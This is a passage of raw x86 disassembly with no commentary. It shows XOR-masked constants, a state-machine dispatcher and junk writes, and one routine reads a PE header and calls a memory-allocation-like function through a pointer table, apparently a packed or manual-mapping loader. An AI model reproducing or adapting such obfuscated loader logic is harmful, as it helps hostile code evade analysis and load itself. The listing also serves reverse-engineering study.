  427776:	mov    ecx,DWORD PTR [ebp-0x10]
  427779:	mov    ecx,DWORD PTR [ecx]
  42777b:	xor    ecx,edi
  42777d:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  427784:	cmp    cl,al
  427786:	jne    0x42781c
  42778c:	mov    eax,DWORD PTR [ebp-0x14]
  42778f:	mov    eax,DWORD PTR [eax]
  427791:	xor    eax,edi
  427793:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  42779a:	mov    ecx,DWORD PTR [ebp+0xc]
  42779d:	mov    ecx,DWORD PTR [ecx]
  42779f:	xor    ecx,edi
  4277a1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277a8:	xor    al,cl
  4277aa:	mov    ecx,DWORD PTR [ebp-0xc]
  4277ad:	mov    ecx,DWORD PTR [ecx]
  4277af:	xor    ecx,edi
  4277b1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277b8:	or     al,cl
  4277ba:	mov    ecx,DWORD PTR [ebp+0xc]
  4277bd:	mov    ecx,DWORD PTR [ecx]
  4277bf:	xor    ecx,edi
  4277c1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  4277c8:	cmp    cl,al
  4277ca:	jne    0x42781c
  4277cc:	mov    eax,DWORD PTR [ebp-0x14]
  4277cf:	mov    eax,DWORD PTR [eax]
  4277d1:	xor    eax,edi
  4277d3:	mov    al,BYTE PTR [ebp+eax*1+0x3272ac]
  4277da:	mov    ecx,DWORD PTR [ebp-0xc]
  4277dd:	mov    ecx,DWORD PTR [ecx]
  4277df:	xor    ecx,edi
  4277e1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277e8:	xor    al,cl
  4277ea:	mov    ecx,DWORD PTR [ebp-0x10]
  4277ed:	mov    ecx,DWORD PTR [ecx]
  4277ef:	xor    ecx,edi
  4277f1:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ac]
  4277f8:	or     al,cl
  4277fa:	mov    ecx,DWORD PTR [ebp-0x14]
  4277fd:	mov    ecx,DWORD PTR [ecx]
  4277ff:	xor    ecx,edi
  427801:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b0]
  427808:	cmp    cl,al
  42780a:	jne    0x42781c
  42780c:	lea    eax,[ebp-0x4c]
  42780f:	push   eax
  427810:	call   0x4272d7
  427815:	mov    ecx,DWORD PTR [ebp-0x44]
  427818:	cmp    eax,ecx
  42781a:	je     0x427826
  42781c:	mov    eax,DWORD PTR [ebp+0x8]
  42781f:	xor    eax,edi
  427821:	add    eax,ebx
  427823:	mov    DWORD PTR [ebp+0x18],eax
  427826:	mov    eax,DWORD PTR [ebp-0x8]
  427829:	xor    eax,edi
  42782b:	lea    eax,[eax+esi*1+0x3272f8]
  427832:	xor    eax,edi
  427834:	mov    ecx,DWORD PTR [ebp+0x8]
  427837:	mov    edx,DWORD PTR [ebp+0x18]
  42783a:	xor    ecx,edi
  42783c:	add    ecx,ebx
  42783e:	cmp    edx,ecx
  427840:	je     0x42763d
  427846:	mov    eax,DWORD PTR [ebp+0x8]
  427849:	mov    ecx,DWORD PTR [ebp+0x18]
  42784c:	xor    eax,edi
  42784e:	add    eax,ebx
  427850:	cmp    ecx,eax
  427852:	jne    0x427865
  427854:	mov    eax,DWORD PTR [ebp-0x8]
  427857:	mov    ecx,DWORD PTR [ebp+0x1c]
  42785a:	xor    eax,edi
  42785c:	lea    eax,[eax+ecx*1+0x3272f8]
  427863:	jmp    0x4278dc
  427865:	push   0x18
  427867:	push   DWORD PTR [ebp-0x4]
  42786a:	lea    eax,[ebp-0x64]
  42786d:	push   eax
  42786e:	call   0x426b51
  427873:	mov    eax,DWORD PTR [ebp+0x8]
  427876:	mov    ecx,DWORD PTR [ebp-0x18]
  427879:	xor    eax,edi
  42787b:	add    eax,ebx
  42787d:	cmp    eax,ecx
  42787f:	je     0x427894
  427881:	mov    eax,DWORD PTR [ebp+0x8]
  427884:	xor    eax,edi
  427886:	add    eax,ebx
  427888:	push   eax
  427889:	push   0x18
  42788b:	lea    eax,[ebp-0x64]
  42788e:	push   eax
  42788f:	call   0x427137
  427894:	mov    eax,DWORD PTR [ebp-0x4]
  427897:	add    eax,0x18
  42789a:	mov    DWORD PTR [ebp+0x18],eax
  42789d:	push   DWORD PTR [ebp-0x50]
  4278a0:	push   DWORD PTR [ebp+0x18]
  4278a3:	mov    eax,DWORD PTR [ebp-0x54]
  4278a6:	add    eax,DWORD PTR [ebp-0x20]
  4278a9:	push   eax
  4278aa:	call   0x426b51
  4278af:	mov    eax,DWORD PTR [ebp+0x8]
  4278b2:	mov    ecx,DWORD PTR [ebp-0x18]
  4278b5:	xor    eax,edi
  4278b7:	add    eax,ebx
  4278b9:	cmp    eax,ecx
  4278bb:	je     0x4278ce
  4278bd:	push   0x0
  4278bf:	push   DWORD PTR [ebp-0x50]
  4278c2:	mov    eax,DWORD PTR [ebp-0x54]
  4278c5:	add    eax,DWORD PTR [ebp-0x20]
  4278c8:	push   eax
  4278c9:	call   0x427137
  4278ce:	mov    eax,DWORD PTR [ebp-0x24]
  4278d1:	mov    ecx,DWORD PTR [ebp-0x50]
  4278d4:	add    DWORD PTR [eax],ecx
  4278d6:	mov    eax,DWORD PTR [ebp-0x50]
  4278d9:	add    eax,DWORD PTR [ebp+0x1c]
  4278dc:	mov    DWORD PTR [ebp+0x1c],eax
  4278df:	mov    eax,DWORD PTR [ebp-0x8]
  4278e2:	mov    ecx,DWORD PTR [ebp+0x1c]
  4278e5:	xor    eax,edi
  4278e7:	add    eax,ebx
  4278e9:	imul   eax,ecx
  4278ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4278ef:	mov    edx,DWORD PTR [ebp-0x28]
  4278f2:	xor    ecx,edi
  4278f4:	lea    ecx,[ecx+edx*1+0x3272f8]
  4278fb:	cmp    eax,ecx
  4278fd:	jb     0x42755b
  427903:	mov    esi,DWORD PTR [ebp+0x14]
  427906:	mov    eax,DWORD PTR [ebp-0x20]
  427909:	mov    DWORD PTR [esi],eax
  42790b:	jmp    0x427952
  42790d:	mov    ecx,DWORD PTR [ebp+0x8]
  427910:	mov    edx,DWORD PTR [ebp+0xc]
  427913:	xor    ecx,edi
  427915:	xor    edx,edi
  427917:	add    ecx,ebx
  427919:	add    edx,ebx
  42791b:	cmp    ecx,edx
  42791d:	jne    0x427931
  42791f:	mov    eax,ds:0x7f642dde
  427924:	imul   eax,eax,0x9f15fcef
  42792a:	mov    ds:0x7f642dde,eax
  42792f:	jmp    0x427952
  427931:	mov    ecx,DWORD PTR [ebp+0x8]
  427934:	xor    ecx,edi
  427936:	add    ecx,ebx
  427938:	cmp    eax,ecx
  42793a:	je     0x427948
  42793c:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  427946:	jmp    0x427952
  427948:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  427952:	pop    edi
  427953:	pop    esi
  427954:	pop    ebx
  427955:	leave  
  427956:	ret    0x18
  427959:	push   ebp
  42795a:	mov    ebp,esp
  42795c:	and    esp,0xfffffff8
  42795f:	mov    eax,DWORD PTR [ebp+0x20]
  427962:	sub    esp,0x14
  427965:	push   ebx
  427966:	mov    ebx,DWORD PTR [ebp+0x14]
  427969:	push   esi
  42796a:	push   edi
  42796b:	cmp    eax,0xf89c85b9
  427970:	jne    0x42797c
  427972:	push   0xf89c85b8
  427977:	jmp    0x427aae
  42797c:	mov    eax,DWORD PTR [ebp+0x20]
  42797f:	cmp    eax,0xf89c85b8
  427984:	jne    0x427990
  427986:	push   0xf89c85bb
  42798b:	jmp    0x427aae
  427990:	mov    eax,DWORD PTR [ebp+0x20]
  427993:	cmp    eax,0xf89c85bb
  427998:	jne    0x4279a4
  42799a:	push   0xf89c85ba
  42799f:	jmp    0x427aae
  4279a4:	mov    eax,DWORD PTR [ebp+0x20]
  4279a7:	cmp    eax,0xf89c85ba
  4279ac:	jne    0x4279b8
  4279ae:	push   0xf89c85bd
  4279b3:	jmp    0x427aae
  4279b8:	mov    ecx,DWORD PTR [ebp+0x20]
  4279bb:	mov    eax,0xf89c85be
  4279c0:	cmp    ecx,eax
  4279c2:	jne    0x427a7e
  4279c8:	mov    eax,DWORD PTR [ebp+0x10]
  4279cb:	mov    DWORD PTR [esp+0xc],eax
  4279cf:	mov    eax,DWORD PTR [ebp+0x18]
  4279d2:	mov    DWORD PTR [esp+0x14],eax
  4279d6:	mov    eax,DWORD PTR [ebp+0xc]
  4279d9:	mov    DWORD PTR [esp+0x18],eax
  4279dd:	mov    eax,DWORD PTR [ebp+0x8]
  4279e0:	mov    DWORD PTR [esp+0x10],eax
  4279e4:	mov    eax,DWORD PTR [esp+0x10]
  4279e8:	mov    ecx,DWORD PTR [esp+0x14]
  4279ec:	mov    edi,0x75108b1
  4279f1:	xor    eax,edi
  4279f3:	mov    esi,0x3272f8
  4279f8:	add    eax,esi
  4279fa:	mov    DWORD PTR [ecx],eax
  4279fc:	mov    eax,DWORD PTR [esp+0xc]
  427a00:	mov    eax,DWORD PTR [eax+0x194]
  427a06:	mov    ecx,DWORD PTR [eax]
  427a08:	mov    eax,DWORD PTR [esp+0xc]
  427a0c:	mov    eax,DWORD PTR [eax+0x194]
  427a12:	mov    eax,DWORD PTR [eax]
  427a14:	add    eax,DWORD PTR [ecx+0x3c]
  427a17:	mov    ecx,DWORD PTR [esp+0xc]
  427a1b:	mov    ecx,DWORD PTR [ecx+0x1e0]
  427a21:	mov    ecx,DWORD PTR [ecx+0x14]
  427a24:	push   0x4
  427a26:	push   0x3000
  427a2b:	push   DWORD PTR [eax+0x50]
  427a2e:	push   0x0
  427a30:	call   ecx
  427a32:	mov    DWORD PTR [ebx],eax
  427a34:	mov    eax,DWORD PTR [esp+0x10]
  427a38:	push   DWORD PTR [esp+0xc]
  427a3c:	xor    eax,edi
  427a3e:	add    eax,esi
  427a40:	mov    DWORD PTR [esp+0x20],eax
  427a44:	lea    eax,[esp+0x20]
  427a48:	push   eax
  427a49:	push   ebx
  427a4a:	push   DWORD PTR [esp+0x20]
  427a4e:	push   DWORD PTR [esp+0x28]
  427a52:	push   DWORD PTR [esp+0x24]
  427a56:	call   0x42741b
  427a5b:	mov    eax,DWORD PTR [esp+0x10]
  427a5f:	mov    ecx,DWORD PTR [ebx]
  427a61:	xor    eax,edi
  427a63:	add    eax,esi
  427a65:	cmp    ecx,eax
  427a67:	je     0x427ac5
  427a69:	mov    eax,DWORD PTR [esp+0x18]
  427a6d:	mov    ecx,DWORD PTR [esp+0x14]
  427a71:	xor    eax,edi
  427a73:	add    eax,esi
  427a75:	imul   eax,DWORD PTR [esp+0x1c]
  427a7a:	mov    DWORD PTR [ecx],eax
  427a7c:	jmp    0x427ac5
  427a7e:	mov    ecx,DWORD PTR [ebp+0x20]
  427a81:	cmp    ecx,0xf89c85bd
  427a87:	jne    0x427a90
  427a89:	push   0xf89c85bc
  427a8e:	jmp    0x427aae
  427a90:	mov    ecx,DWORD PTR [ebp+0x20]
  427a93:	cmp    ecx,0xf89c85bc
  427a99:	jne    0x427aa2
  427a9b:	push   0xf89c85bf
  427aa0:	jmp    0x427aae
  427aa2:	mov    ecx,DWORD PTR [ebp+0x20]
  427aa5:	cmp    ecx,0xf89c85bf
  427aab:	jne    0x427ac5
  427aad:	push   eax
  427aae:	push   DWORD PTR [ebp+0x1c]
  427ab1:	push   DWORD PTR [ebp+0x18]
  427ab4:	push   ebx
  427ab5:	push   DWORD PTR [ebp+0x10]
  427ab8:	push   DWORD PTR [ebp+0xc]
  427abb:	push   DWORD PTR [ebp+0x8]
  427abe:	call   0x427959
  427ac3:	mov    DWORD PTR [ebx],eax
  427ac5:	mov    eax,DWORD PTR [ebx]
  427ac7:	pop    edi
  427ac8:	pop    esi
  427ac9:	pop    ebx
  427aca:	mov    esp,ebp
  427acc:	pop    ebp
  427acd:	ret    0x1c
  427ad0:	push   ebp
  427ad1:	mov    ebp,esp
  427ad3:	sub    esp,0xc
  427ad6:	mov    eax,0xf89c85b9
  427adb:	mov    DWORD PTR [ebp-0x8],eax
  427ade:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  427ae5:	mov    ecx,DWORD PTR [ebp-0x8]
  427ae8:	xor    ecx,0x75108b1
  427aee:	add    ecx,0x3272f8
  427af4:	mov    DWORD PTR [ebp-0x4],ecx
  427af7:	mov    ecx,DWORD PTR [ebp+0xc]
  427afa:	push   eax
  427afb:	mov    DWORD PTR [ebp+0xc],ecx
  427afe:	push   DWORD PTR [ebp+0xc]
  427b01:	lea    eax,[ebp-0x4]
  427b04:	push   DWORD PTR [ebp+0x8]
  427b07:	push   eax
  427b08:	push   DWORD PTR [ebp+0xc]
  427b0b:	push   DWORD PTR [ebp-0xc]
  427b0e:	push   DWORD PTR [ebp-0x8]
  427b11:	call   0x427959
  427b16:	mov    DWORD PTR [ebp-0x4],eax
  427b19:	mov    eax,DWORD PTR [ebp-0x4]
  427b1c:	leave  
  427b1d:	ret    0x8
